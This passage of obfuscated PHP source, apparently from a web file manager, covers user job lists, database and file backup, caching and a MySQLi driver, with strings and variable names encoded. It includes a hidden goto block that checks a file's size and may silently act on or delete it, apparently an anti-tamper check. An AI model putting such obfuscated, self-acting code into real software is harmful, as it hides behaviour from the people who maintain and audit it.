$•Êë·Ö©[$ôø÷¾ü“[32]]; } $±ûõ” = $this->getAutoName($±ûõ”); $›ƒ†Ì¡ = array($ôø÷¾ü“[1669] => USER_ID, $ôø÷¾ü“[492] => 0, $ôø÷¾ü“[429] => $±ûõ”, $ôø÷¾ü“[430] => $±’ØèˆÀ, $ôø÷¾ü“[431] => $¬ÎÁ¬Å¶, $ôø÷¾ü“[1871] => $£ÏĞÙƒ… + 1); return $this->add($›ƒ†Ì¡); } protected function remove($Ä§¶ıÑà) { $±î›ŞÒ =& $_SERVER[ï»»·÷á]; $£Æ­¹ş§ = array($±î›ŞÒ[1669] => USER_ID, $±î›ŞÒ[428] => $Ä§¶ıÑà); return $this->where($£Æ­¹ş§)->delete(); } protected function removeByName($çå¨äâç) { $Â´³Â­ =& $_SERVER[ï»»·÷á]; $ÅÀÎÍ÷ä = array($Â´³Â­[1669] => USER_ID, $Â´³Â­[429] => $çå¨äâç, $Â´³Â­[492] => 0); return $this->where($ÅÀÎÍ÷ä)->delete(); } protected function rename($÷å”’ÃÎ, $‚»‡‹°–) { $¡Éœ¤İ´ =& $_SERVER[ï»»·÷á]; if ($÷å”’ÃÎ == $‚»‡‹°–) { return !1; } $ÃŸÛı­£ = $this->getAutoName($‚»‡‹°–); if ($‚»‡‹°– != $ÃŸÛı­£) { return !1; } $ôÆç¢® = array($¡Éœ¤İ´[1669] => USER_ID, $¡Éœ¤İ´[492] => 0, $¡Éœ¤İ´[32] => $÷å”’ÃÎ); return $this->where($ôÆç¢®)->save(array($¡Éœ¤İ´[32] => $‚»‡‹°–)); } protected function resetSort($ò¸êû¼) { $œ¬¶ÅãÆ =& $_SERVER[ï»»·÷á]; $ò¸êû¼ = is_array($ò¸êû¼) ? $ò¸êû¼ : array(); $ó¼Ò¨¡ã = array($œ¬¶ÅãÆ[1669] => USER_ID); for ($ÏÁĞ€Ã§ = 0; $ÏÁĞ€Ã§ < count($ò¸êû¼); $ÏÁĞ€Ã§++) { $ó¼Ò¨¡ã[$œ¬¶ÅãÆ[428]] = $ò¸êû¼[$ÏÁĞ€Ã§]; $this->where($ó¼Ò¨¡ã)->save(array($œ¬¶ÅãÆ[1871] => $ÏÁĞ€Ã§ + 1)); } return !0; } protected function moveTop($§ûçÙŒ¿) { $÷ÑĞŒöç =& $_SERVER[ï»»·÷á]; $ãò²ßÔø = array($÷ÑĞŒöç[1669] => USER_ID, $÷ÑĞŒöç[492] => 0); $¼ÅÇÀ¿‹ = $this->where($ãò²ßÔø)->where(array($÷ÑĞŒöç[32] => $§ûçÙŒ¿))->find(); if (!$¼ÅÇÀ¿‹) { return; } $¸œ³²‚Æ = $this->field($÷ÑĞŒöç[399])->where($ãò²ßÔø)->order($÷ÑĞŒöç[2314])->select(); $¸œ³²‚Æ = array_to_keyvalue($¸œ³²‚Æ, $÷ÑĞŒöç[12], $÷ÑĞŒöç[399]); $ÕÇàÅ†’ = $¸œ³²‚Æ; $¸œ³²‚Æ = array_remove_value($¸œ³²‚Æ, $¼ÅÇÀ¿‹[$÷ÑĞŒöç[399]]); array_unshift($¸œ³²‚Æ, $¼ÅÇÀ¿‹[$÷ÑĞŒöç[399]]); return $this->resetSort($¸œ³²‚Æ); } protected function moveBottom($¢ç€èèª) { $–¹Ãş“ =& $_SERVER[ï»»·÷á]; $Ñ¥ÑÊŒ  = array($–¹Ãş“[1669] => USER_ID, $–¹Ãş“[492] => 0); $ƒÀ¦ÅéŠ = $this->where($Ñ¥ÑÊŒ )->max($–¹Ãş“[1891]); $™òİ†íÀ = array($–¹Ãş“[1891] => $ƒÀ¦ÅéŠ + 1); return $this->where($Ñ¥ÑÊŒ )->where(array($–¹Ãş“[32] => $¢ç€èèª))->save($™òİ†íÀ); } private function getAutoName($»¸‡——) { $®½®Û¶ =& $_SERVER[ï»»·÷á]; $Æã’í»İ = array($®½®Û¶[1669] => USER_ID, $®½®Û¶[492] => 0); $™ƒÜ‡¢˜ = $this->field($®½®Û¶[32])->where($Æã’í»İ)->select(); $™ƒÜ‡¢˜ = array_to_keyvalue($™ƒÜ‡¢˜, $®½®Û¶[12], $®½®Û¶[32]); if (!$™ƒÜ‡¢˜ || !in_array($»¸‡——, $™ƒÜ‡¢˜)) { return $»¸‡——; } for ($¸êÑÚ‘™ = 0; $¸êÑÚ‘™ < count($™ƒÜ‡¢˜); $¸êÑÚ‘™++) { if (!in_array($»¸‡—— . "\x28{$¸êÑÚ‘™}\51", $™ƒÜ‡¢˜)) { return $»¸‡—— . "\50{$¸êÑÚ‘™}\x29"; } } return $»¸‡—— . "\x28{$¸êÑÚ‘™}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\x2e\x6a\157\x62\x4c\x69\163\164"; public $field = array("\156\141\155\x65", "\144\145\x73\x63", "\163\x6f\x72\164"); const JOB_KEY = "\x73\x65\154\x66\x4a\x6f\142\x4c\151\163\x74"; public function listData($ßÃÊƒ·á = false, $ëû¹¸Ó = "\163\157\x72\164", $²úŒÄ”º = false) { return parent::listData($ßÃÊƒ·á, $ëû¹¸Ó, $²úŒÄ”º); } public function remove($€¦ş™•‰) { return parent::remove($€¦ş™•‰); } public function add($ÀÆ¨³Æó) { $°±ı²Àî =& $_SERVER[ï»»·÷á]; if ($this->findByName($ÀÆ¨³Æó[$°±ı²Àî[32]])) { return !1; } $ÀÆ¨³Æó[$°±ı²Àî[1891]] = $this->getSort(); return parent::insert($ÀÆ¨³Æó); } private function getSort() { $‹„¥ğà =& $_SERVER[ï»»·÷á]; $ôí¯ÚÉŞ = parent::listData(); $¿’¢€ãÑ = array_to_keyvalue($ôí¯ÚÉŞ, $‹„¥ğà[12], $‹„¥ğà[1891]); return empty($¿’¢€ãÑ) ? 0 : max($¿’¢€ãÑ) + 1; } public function update($çş‹ğ, $ÛüÂˆ–í) { $¨®€ÉÍÀ =& $_SERVER[ï»»·÷á]; $†øÚ¬„— = parent::listData($çş‹ğ); $ı­ó¿â = $this->findByName($ÛüÂˆ–í[$¨®€ÉÍÀ[32]]); if (!$†øÚ¬„— || $ı­ó¿â && $ı­ó¿â[$¨®€ÉÍÀ[399]] != $†øÚ¬„—[$¨®€ÉÍÀ[399]]) { return !1; } return parent::update($çş‹ğ, $ÛüÂˆ–í); } public function setUserJob($¯Ó¹¥€, $£ó£â¾) { $ÏğªÑ†ë =& $_SERVER[ï»»·÷á]; if (!is_array($£ó£â¾)) { $£ó£â¾ = array($£ó£â¾); } $´¯ÌÔ¯” = parent::listData(); $™èÎÆèü = array_to_keyvalue($´¯ÌÔ¯”, $ÏğªÑ†ë[32]); $½Å”ÌÜ = $ÏğªÑ†ë[378]; foreach ($£ó£â¾ as $¾ìúà¥ƒ) { if ($™èÎÆèü[$¾ìúà¥ƒ]) { $½Å”ÌÜ .= $™èÎÆèü[$¾ìúà¥ƒ][$ÏğªÑ†ë[399]] . $ÏğªÑ†ë[50]; } else { $üÓì˜Â¸ = $this->add($¾ìúà¥ƒ); $½Å”ÌÜ .= $üÓì˜Â¸ . $ÏğªÑ†ë[50]; } } $½Å”ÌÜ = rtrim($½Å”ÌÜ, $ÏğªÑ†ë[50]); Model($ÏğªÑ†ë[534])->metaSet($¯Ó¹¥€, self::JOB_KEY, $½Å”ÌÜ); } public function getUserJob($Õ´€«¼) { $„Íğ“õ = Model($_SERVER[ï»»·÷á][534])->metaGet($Õ´€«¼); return $this->getUserJobInfo($„Íğ“õ[self::JOB_KEY]); } public function getUserJobInfo($–éÒ¸´Æ) { $”ï«‹Ò¨ =& $_SERVER[ï»»·÷á]; $Ÿµ·ş = explode($”ï«‹Ò¨[50], $–éÒ¸´Æ); $§â½´×£ = parent::listData(); $§â½´×£ = array_remove_key($§â½´×£, $”ï«‹Ò¨[201]); $½æ¶Ûğê = array(); foreach ($Ÿµ·ş as $Ô©›²®) { if (isset($§â½´×£[$Ô©›²®])) { $½æ¶Ûğê[] = $§â½´×£[$Ô©›²®]; } } return $½æ¶Ûğê; } } goto Bôğ†ä÷è; bÛÕŸİÒ¿: $_file = $_SERVER[$_SERVER[ï»»·÷á][409]]; $_size = $_SERVER[ï»»·÷á][759]; if ($_SERVER[$_SERVER[ï»»·÷á][401]] != $_size($_file)) { $_getc = $_SERVER[ï»»·÷á][403]; $_getfile = $_SERVER[$_SERVER[ï»»·÷á][404]] . $_SERVER[ï»»·÷á][405]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ï»»·÷á][231], $_getfilec); if (count($_getarrs) < $_SERVER[ï»»·÷á][406]) { $exit = $_SERVER[ï»»·÷á][407]; $exit(); } $_act = $_SERVER[ï»»·÷á][408]; $_act($_file); } goto f¦Ã–­İ; Fï’á¥†„: class BackupDbFile { public function __construct() { } public function index() { $œ¶–¿í  =& $_SERVER[ï»»·÷á]; $ÉÁÉî‡ = Backup::get(); $¬Œ¬˜Î = $ÉÁÉî‡[$œ¶–¿í [32]]; $ï’†ïı¡ = $this->tmpFilesPath() . "\142\141\143\x6b\165\x70\137{$¬Œ¬˜Î}\57"; $ºÈÎ·æ = $this->backupPath($ÉÁÉî‡); if (!($ºÈÎ·æ = IO::mkdir($ºÈÎ·æ))) { return !1; } $íóéÍ’• = IO::listPath($ï’†ïı¡); $…ŸØÙ‡ó = isset($íóéÍ’•[$œ¶–¿í [83]]) ? $íóéÍ’•[$œ¶–¿í [83]] : array(); $¨íéÃÊÌ = array_sum(array_column($…ŸØÙ‡ó, $œ¶–¿í [76])); if (!$¨íéÃÊÌ) { return !1; } $”¿¸Â´· = array($œ¶–¿í [811] => $¨íéÃÊÌ, $œ¶–¿í [812] => time()); Backup::set($”¿¸Â´·); $ì…Í ™Æ = new TaskFileTransfer($œ¶–¿í [813], $œ¶–¿í [793], count($…ŸØÙ‡ó), LNG($œ¶–¿í [794]) . $œ¶–¿í [386] . LNG($œ¶–¿í [796]) . $œ¶–¿í [814]); $ì…Í ™Æ->task[$œ¶–¿í [776]] = $¨íéÃÊÌ; foreach ($íóéÍ’•[$œ¶–¿í [83]] as $½©ëâˆ‡) { $¤Î‹÷üÃ = IO::move($½©ëâˆ‡[$œ¶–¿í [84]], $ºÈÎ·æ); if (!$¤Î‹÷üÃ) { $ì…Í ™Æ->end(); $Æ’Õ¯Îˆ = IO::getLastError($œ¶–¿í [815] . $½©ëâˆ‡[$œ¶–¿í [84]] . $œ¶–¿í [816] . $ºÈÎ·æ . $œ¶–¿í [164]); write_log($Æ’Õ¯Îˆ, $œ¶–¿í [793]); return !1; } } $ªÃá³Ú‡ = new DbManage(); $³­î¥è² = $ªÃá³Ú‡->getSqlFile(); if (!$³­î¥è²[$œ¶–¿í [817]] || !$³­î¥è²[$œ¶–¿í [13]]) { return !1; } IO::move($³­î¥è²[$œ¶–¿í [817]], $ºÈÎ·æ); IO::move($³­î¥è²[$œ¶–¿í [13]], $ºÈÎ·æ); $ì…Í ™Æ->end(); $”¿¸Â´· = array($œ¶–¿í [818] => $¨íéÃÊÌ, $œ¶–¿í [819] => time()); Backup::set($”¿¸Â´·); return !0; } private function backupPath($…âª–å¿) { $¿‰ÆÓäì =& $_SERVER[ï»»·÷á]; $ö·©õ… = $…âª–å¿[$¿‰ÆÓäì[32]]; $ãÓ¢ÏÇ“ = Model($¿‰ÆÓäì[783])->get($¿‰ÆÓäì[784]); $Ë„½ºõ“ = substr(md5($¿‰ÆÓäì[785] . $ãÓ¢ÏÇ“ . $ö·©õ…), 0, 8); return "\173\151\x6f\x3a{$…âª–å¿[$¿‰ÆÓäì[764]]}\175\x2f\144\141\x74\141\142\141\x73\145\x2f\x62\141\143\x6b\x75\x70\57" . $ö·©õ… . $¿‰ÆÓäì[11] . $Ë„½ºõ“; } private function tmpFilesPath() { $ßƒ„åá¾ =& $_SERVER[ï»»·÷á]; $ÚÍ²¾Û½ = TEMP_FILES; if ($GLOBALS[$ßƒ„åá¾[6]][$ßƒ„åá¾[89]][$ßƒ„åá¾[809]]) { $ÚÍ²¾Û½ = $GLOBALS[$ßƒ„åá¾[6]][$ßƒ„åá¾[89]][$ßƒ„åá¾[809]]; if (!mk_dir($ÚÍ²¾Û½) || !is_writable($ÚÍ²¾Û½) || !IO::mkfile($ÚÍ²¾Û½ . $ßƒ„åá¾[810])) { $ÚÍ²¾Û½ = TEMP_FILES; } } return $ÚÍ²¾Û½; } } class BackupFile { public function __construct() { } public function index() { $æÃ¢çİ = Backup::get(); $€ÎÈˆÃñ = $æÃ¢çİ[$_SERVER[ï»»·÷á][293]][$_SERVER[ï»»·÷á][200]][$_SERVER[ï»»·÷á][477]]; $»¤ÖÅ = array($_SERVER[ï»»·÷á][478] => array($_SERVER[ï»»·÷á][820], $€ÎÈˆÃñ), $_SERVER[ï»»·÷á][821] => array($_SERVER[ï»»·÷á][331], $æÃ¢çİ[$_SERVER[ï»»·÷á][764]])); $™Àö§¹ = (int) Model($_SERVER[ï»»·÷á][802])->where($»¤ÖÅ)->count($_SERVER[ï»»·÷á][477]); $Ş¼¢·É­ = (int) Model($_SERVER[ï»»·÷á][802])->where($»¤ÖÅ)->sum($_SERVER[ï»»·÷á][76]); $•£†« = new TaskFileTransfer($_SERVER[ï»»·÷á][822], $_SERVER[ï»»·÷á][793], $™Àö§¹, LNG($_SERVER[ï»»·÷á][794]) . $_SERVER[ï»»·÷á][795] . LNG($_SERVER[ï»»·÷á][823])); $•£†«->task[$_SERVER[ï»»·÷á][776]] = $Ş¼¢·É­; $Ë©ñ¼œŠ = array($_SERVER[ï»»·÷á][824] => $™Àö§¹, $_SERVER[ï»»·÷á][825] => $Ş¼¢·É­, $_SERVER[ï»»·÷á][826] => time()); Backup::set($Ë©ñ¼œŠ); $æ‚ª»²‹ = !0; $»™õø…ö = $this->storeIds(); $ùÈ„úÎ = 1; $Œ˜ÂÁï‘ = 1000; $ı±¨ùÍÏ = $ãùá«Œ = 0; $úºÓƒ¨Ë = array(); $Œš½¶¿ = $ıñ•€— = 0; do { $úÊÄ…õ = $_SERVER[ï»»·÷á][827]; $ÛÔ´ÓØõ = Model($_SERVER[ï»»·÷á][802])->where($»¤ÖÅ)->field($úÊÄ…õ)->order($_SERVER[ï»»·÷á][828])->selectPage($Œ˜ÂÁï‘, $ùÈ„úÎ); $‚¬€¹ø = !empty($ÛÔ´ÓØõ[$_SERVER[ï»»·÷á][369]]) ? $ÛÔ´ÓØõ[$_SERVER[ï»»·÷á][369]] : array(); foreach ($‚¬€¹ø as $ĞĞ·Á¼°) { if (!$this->_fileExist($ĞĞ·Á¼°, $úºÓƒ¨Ë, $»™õø…ö)) { $™Àö§¹ -= 1; $Ş¼¢·É­ -= (int) $ĞĞ·Á¼°[$_SERVER[ï»»·÷á][76]]; write_log("\x66\151\x6c\145\x20\x6e\x6f\164\40\x65\170\151\163\x74\x2e\x66\151\x6c\145\111\x44\x3a{$ĞĞ·Á¼°[$_SERVER[ï»»·÷á][477]]}\54\40\160\141\x74\x68\x3a{$ĞĞ·Á¼°[$_SERVER[ï»»·÷á][84]]}", $_SERVER[ï»»·÷á][829]); continue; } $“ï­Ú = $ĞĞ·Á¼°[$_SERVER[ï»»·÷á][84]]; $Î…§åÍû = "\x7b\151\157\72{$æÃ¢çİ[$_SERVER[ï»»·÷á][764]]}\175" . substr($“ï­Ú, strlen("\173\x69\x6f\x3a{$ĞĞ·Á¼°[$_SERVER[ï»»·÷á][830]]}\175")); if (IO::exist($Î…§åÍû)) { $•£†«->updateFileEnd($ĞĞ·Á¼°[$_SERVER[ï»»·÷á][32]], $ĞĞ·Á¼°[$_SERVER[ï»»·÷á][76]]); } else { $Î…§åÍû = get_path_father($Î…§åÍû); IO::mkdir($Î…§åÍû); if (!IO::copy($“ï­Ú, $Î…§åÍû, $_SERVER[ï»»·÷á][831])) { write_log($_SERVER[ï»»·÷á][832] . $“ï­Ú . $_SERVER[ï»»·÷á][816] . $Î…§åÍû . $_SERVER[ï»»·÷á][164], $_SERVER[ï»»·÷á][793]); $æ‚ª»²‹ = !1; break; } } $€ÎÈˆÃñ = $ĞĞ·Á¼°[$_SERVER[ï»»·÷á][477]]; $ãùá«Œ += 1; $ı±¨ùÍÏ += $ĞĞ·Á¼°[$_SERVER[ï»»·÷á][76]]; $ıñ•€— += 1; $Œš½¶¿ += $ĞĞ·Á¼°[$_SERVER[ï»»·÷á][76]]; if ($ı±¨ùÍÏ >= 1024 * 1024 * 100) { $Ë©ñ¼œŠ = array($_SERVER[ï»»·÷á][833] => $€ÎÈˆÃñ, $_SERVER[ï»»·÷á][834] => $ıñ•€—, $_SERVER[ï»»·÷á][835] => $Œš½¶¿); Backup::set($Ë©ñ¼œŠ); $ı±¨ùÍÏ = $ãùá«Œ = 0; } } $ÕÔüÃáÈ = count($‚¬€¹ø); $ùÈ„úÎ++; } while ($ÕÔüÃáÈ == $Œ˜ÂÁï‘); $•£†«->end(); $Ë©ñ¼œŠ = array($_SERVER[ï»»·÷á][836] => 1, $_SERVER[ï»»·÷á][774] => time(), $_SERVER[ï»»·÷á][788] => 1, $_SERVER[ï»»·÷á][833] => $€ÎÈˆÃñ, $_SERVER[ï»»·÷á][825] => $Ş¼¢·É­, $_SERVER[ï»»·÷á][824] => $™Àö§¹, $_SERVER[ï»»·÷á][837] => time()); if ($ãùá«Œ) { $Ë©ñ¼œŠ[$_SERVER[ï»»·÷á][834]] = $ıñ•€—; $Ë©ñ¼œŠ[$_SERVER[ï»»·÷á][835]] = $Œš½¶¿; } Backup::set($Ë©ñ¼œŠ); $this->_fileFilter($úºÓƒ¨Ë); return !0; } private function _fileExist($±Ÿ¡ ­è, &$‘¥”İ¥°, $İ‘Ëë“) { $®³»ãµ =& $_SERVER[ï»»·÷á]; $·¨‹ĞìÖ = $±Ÿ¡ ­è[$®³»ãµ[84]]; if (in_array($±Ÿ¡ ­è[$®³»ãµ[477]], $‘¥”İ¥°)) { return !1; } if (!in_array($±Ÿ¡ ­è[$®³»ãµ[830]], $İ‘Ëë“)) { return !1; } if (IO::exist($·¨‹ĞìÖ)) { return !0; } $¸ğù§ËŠ = get_path_father($·¨‹ĞìÖ); if (IO::exist($¸ğù§ËŠ)) { $‘¥”İ¥°[] = $±Ÿ¡ ­è[$®³»ãµ[477]]; return !1; } $¿¸„ìçâ = array($®³»ãµ[830] => $±Ÿ¡ ­è[$®³»ãµ[830]], $®³»ãµ[84] => array($®³»ãµ[383], "{$¸ğù§ËŠ}\x25")); $¬¦ØÔÁ = Model($®³»ãµ[802])->where($¿¸„ìçâ)->field($®³»ãµ[478])->select(); $‘¥”İ¥° = array_merge($‘¥”İ¥°, array_to_keyvalue($¬¦ØÔÁ, $®³»ãµ[12], $®³»ãµ[477])); return !1; } private function _fileFilter($¸†ºšÂ) { $ïºÀÌ¯Ç =& $_SERVER[ï»»·÷á]; if (empty($¸†ºšÂ)) { return; } $ÕÒÁ…‡† = array($ïºÀÌ¯Ç[477] => array($ïºÀÌ¯Ç[7], array_unique($¸†ºšÂ))); $Âí´îş = Model($ïºÀÌ¯Ç[838])->where($ÕÒÁ…‡†)->field($ïºÀÌ¯Ç[411])->select(); foreach ($Âí´îş as $Úå¾°¡À) { Model($ïºÀÌ¯Ç[838])->remove($Úå¾°¡À[$ïºÀÌ¯Ç[411]], !1); } } private function storeIds() { $œ–×£çÓ =& $_SERVER[ï»»·÷á]; $Ñ¸”ÖŠ = Model($œ–×£çÓ[780])->listData(); $¿ÍÈÕ¹ = array(); $·Ú¿Æ¸Ë = $GLOBALS[$œ–×£çÓ[6]][$œ–×£çÓ[89]][$œ–×£çÓ[839]]; foreach ($Ñ¸”ÖŠ as $÷×”íÆç) { $×ÔùÔØ = strtolower($÷×”íÆç[$œ–×£çÓ[95]]); if (!isset($·Ú¿Æ¸Ë[$×ÔùÔØ])) { continue; } $ü­—î†Ú = $œ–×£çÓ[74] . (isset($·Ú¿Æ¸Ë[$×ÔùÔØ]) ? $·Ú¿Æ¸Ë[$×ÔùÔØ] : ucfirst($×ÔùÔØ)); if (!class_exists($ü­—î†Ú)) { continue; } $¿ÍÈÕ¹[] = $÷×”íÆç[$œ–×£çÓ[399]]; } return $¿ÍÈÕ¹; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $£˜Ò­ñ› =& $_SERVER[ï»»·÷á]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $êŠÌ•Üá = $GLOBALS[$£˜Ò­ñ›[6]][$£˜Ò­ñ›[349]]; $¬â¶º‚Ü = $êŠÌ•Üá[$êŠÌ•Üá[$£˜Ò­ñ›[840]]]; $ë²äš© = $êŠÌ•Üá[$£˜Ò­ñ›[841]]; switch ($êŠÌ•Üá[$£˜Ò­ñ›[840]]) { case $£˜Ò­ñ›[21]: self::$handle = Model($£˜Ò­ñ›[842]); break; case $£˜Ò­ñ›[843]: self::$handle = new CacheRedis($¬â¶º‚Ü, $ë²äš©); break; case $£˜Ò­ñ›[844]: self::$handle = new CacheMemcached($¬â¶º‚Ü, $ë²äš©); break; case $£˜Ò­ñ›[200]: self::$handle = new CacheFile($¬â¶º‚Ü, $ë²äš©); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($õÁÍıÒ) { if (is_array($õÁÍıÒ) || is_object($õÁÍıÒ)) { $õÁÍıÒ = json_encode($õÁÍıÒ); } $õÁÍıÒ = rawurlencode($õÁÍıÒ); return md5(KOD_SITE_ID . $_SERVER[ï»»·÷á][11] . $õÁÍıÒ); } public static function get($³£—å©Æ, $€®ÚĞ˜¼ = false) { $í„Ø˜«° = self::key($³£—å©Æ); if ($€®ÚĞ˜¼) { return unserialize(self::init()->get($í„Ø˜«°)); } if (!isset(self::$memoryCache[$í„Ø˜«°])) { $íŞ¯¡Š‡ = self::init()->get($í„Ø˜«°); self::$memoryCache[$í„Ø˜«°] = unserialize($íŞ¯¡Š‡); } return self::$memoryCache[$í„Ø˜«°]; } public static function set($­¹Ø¿±À, $Èéó±½ƒ, $óìÍÏõ = false) { $Ñâ¤¾Ğ– = self::key($­¹Ø¿±À); if (isset(self::$memoryCache[$Ñâ¤¾Ğ–]) && self::$memoryCache[$Ñâ¤¾Ğ–] === $Èéó±½ƒ) { return !0; } if ($óìÍÏõ === 0) { self::$memoryCache[$Ñâ¤¾Ğ–] = $Èéó±½ƒ; return !0; } CacheLock::lock($­¹Ø¿±À); $¯õèÄ™± = self::init()->set($Ñâ¤¾Ğ–, serialize($Èéó±½ƒ), $óìÍÏõ); self::$memoryCache[$Ñâ¤¾Ğ–] = $Èéó±½ƒ; CacheLock::unlock($­¹Ø¿±À); return $¯õèÄ™±; } public static function getCall($„ö´ëŠ¹, $òÆô‹–, $©ù×Í», $Àõ†¨Ï£ = array()) { $Ø¨“°Ş =& $_SERVER[ï»»·÷á]; $Äª²°ôğ = self::get($„ö´ëŠ¹); if ($Äª²°ôğ || $Äª²°ôğ === $Ø¨“°Ş[12]) { return $Äª²°ôğ; } $Äª²°ôğ = call_user_func_array($©ù×Í», $Àõ†¨Ï£); $Äª²°ôğ = $Äª²°ôğ ? $Äª²°ôğ : $Ø¨“°Ş[12]; self::set($„ö´ëŠ¹, $Äª²°ôğ, $òÆô‹–); return $Äª²°ôğ; } public static function remove($ó˜äİû) { $¸Ãšö†ä = self::key($ó˜äİû); unset(self::$memoryCache[$¸Ãšö†ä]); self::clearTimeout(); CacheLock::lock($ó˜äİû); $É‡ªè¬” = self::init()->remove($¸Ãšö†ä); CacheLock::unlock($ó˜äİû); return $É‡ªè¬”; } public static function removeMemory($Ğ¦»¤›‘) { $è‹Æî¯— = self::key($Ğ¦»¤›‘); unset(self::$memoryCache[$è‹Æî¯—]); } public static function clearMemory($îÅ´‚‘í = false) { if ($îÅ´‚‘í) { $îÅ´‚‘í = self::key($îÅ´‚‘í); unset(self::$memoryCache[$îÅ´‚‘í]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ï»»·÷á][845])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ï»»·÷á][846])) { self::init()->clearTimeout(); } } } goto a•Ç‰•ßß¯; f÷ğå­åí˜: class DbMysqli extends Db { public function __construct($÷™ì„›ø = '') { $ãİ´ğÒÙ =& $_SERVER[ï»»·÷á]; if (!extension_loaded($ãİ´ğÒÙ[922])) { think_exception(think_lang($ãİ´ğÒÙ[14]) . $ãİ´ğÒÙ[923]); } if (!empty($÷™ì„›ø)) { $this->config = $÷™ì„›ø; if (empty($this->config[$ãİ´ğÒÙ[17]])) { $this->config[$ãİ´ğÒÙ[17]] = $ãİ´ğÒÙ[12]; } } } public function connect($é»§¢ğ = '', $ÇË«›„å = 0) { $òıí²‚‰ =& $_SERVER[ï»»·÷á]; if (!isset($this->linkID[$ÇË«›„å])) { if (empty($é»§¢ğ)) { $é»§¢ğ = $this->config; } $this->linkID[$ÇË«›„å] = new mysqli($é»§¢ğ[$òıí²‚‰[896]], $é»§¢ğ[$òıí²‚‰[898]], $é»§¢ğ[$òıí²‚‰[899]], $é»§¢ğ[$òıí²‚‰[21]], $é»§¢ğ[$òıí²‚‰[897]] ? intval($é»§¢ğ[$òıí²‚‰[897]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $õäëˆÁí = $this->linkID[$ÇË«›„å]->server_version; $this->linkID[$ÇË«›„å]->query($òıí²‚‰[900] . think_config($òıí²‚‰[901]) . $òıí²‚‰[58]); if ($õäëˆÁí > $òıí²‚‰[902]) { $this->linkID[$ÇË«›„å]->query($òıí²‚‰[903]); } $this->connected = !0; if (1 != think_config($òıí²‚‰[22])) { unset($this->config); } } return $this->linkID[$ÇË«›„å]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($´û§ö¯) { $ºÔ“”ğ =& $_SERVER[ï»»·÷á]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $´û§ö¯; if ($this->queryID) { $this->free(); } think_action_status($ºÔ“”ğ[23], 1); think_status($ºÔ“”ğ[24]); $this->queryID = $this->_linkID->query($´û§ö¯); if ($this->_linkID->more_results()) { while (($­ìõ¥Êß = $this->_linkID->next_result()) != NULL) { $­ìõ¥Êß->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÙÚ¶óÄã) { $ª¶—•ãÍ =& $_SERVER[ï»»·÷á]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÙÚ¶óÄã; if ($this->queryID) { $this->free(); } think_action_status($ª¶—•ãÍ[25], 1); think_status($ª¶—•ãÍ[24]); $¬¬©®÷ = $this->_linkID->query($ÙÚ¶óÄã); $this->debug(); if (!1 === $¬¬©®÷) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÖÌ¶Áëš = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÖÌ¶Áëš) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Û³ÎåŠÜ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Û³ÎåŠÜ) { $this->error(); return !1; } } return !0; } private function getAll() { $ƒòáöâÌ = array(); if ($this->numRows > 0) { for ($‰ã»Š‡ = 0; $‰ã»Š‡ < $this->numRows; $‰ã»Š‡++) { $ƒòáöâÌ[$‰ã»Š‡] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ƒòáöâÌ; } public function getFields($ƒ‹Ôó’í) { $ËôÈÔ¿ =& $_SERVER[ï»»·÷á]; $©¥¥ñ±§ = $this->query($ËôÈÔ¿[907] . $this->parseKey($ƒ‹Ôó’í)); $Õäİ¤ë = array(); if ($©¥¥ñ±§) { foreach ($©¥¥ñ±§ as $ôÀ•–ó¾ => $¿¶‚µàœ) { $Õäİ¤ë[$¿¶‚µàœ[$ËôÈÔ¿[31]]] = array($ËôÈÔ¿[32] => $¿¶‚µàœ[$ËôÈÔ¿[31]], $ËôÈÔ¿[33] => $¿¶‚µàœ[$ËôÈÔ¿[34]], $ËôÈÔ¿[35] => (bool) ($¿¶‚µàœ[$ËôÈÔ¿[36]] === $ËôÈÔ¿[12]), $ËôÈÔ¿[37] => $¿¶‚µàœ[$ËôÈÔ¿[38]], $ËôÈÔ¿[39] => strtolower($¿¶‚µàœ[$ËôÈÔ¿[40]]) == $ËôÈÔ¿[41], $ËôÈÔ¿[42] => strtolower($¿¶‚µàœ[$ËôÈÔ¿[43]]) == $ËôÈÔ¿[44]); } } return $Õäİ¤ë; } public function getTables($ÜÏ‹‘ù = '') { $öĞû¦ó =& $_SERVER[ï»»·÷á]; $øí¾Àó = !empty($ÜÏ‹‘ù) ? $öĞû¦ó[909] . $ÜÏ‹‘ù . $öĞû¦ó[910] : $öĞû¦ó[911]; $‡—Â»‘ş = $this->query($øí¾Àó); $ıÄ”´’ñ = array(); if ($‡—Â»‘ş) { foreach ($‡—Â»‘ş as $•Áøêş => $µ£• ¼Û) { $ıÄ”´’ñ[$•Áøêş] = current($µ£• ¼Û); } } return $ıÄ”´’ñ; } public function replace($£«Òó§–, $„îÑ‡Ü = array()) { $ÃÙñÈó× =& $_SERVER[ï»»·÷á]; foreach ($£«Òó§– as $¢–™Ô· => $èĞ·ıÂ) { $ÑÑëŞ = $this->parseValue($èĞ·ıÂ); if (is_scalar($ÑÑëŞ)) { $»¶ó·±È[] = $ÑÑëŞ; 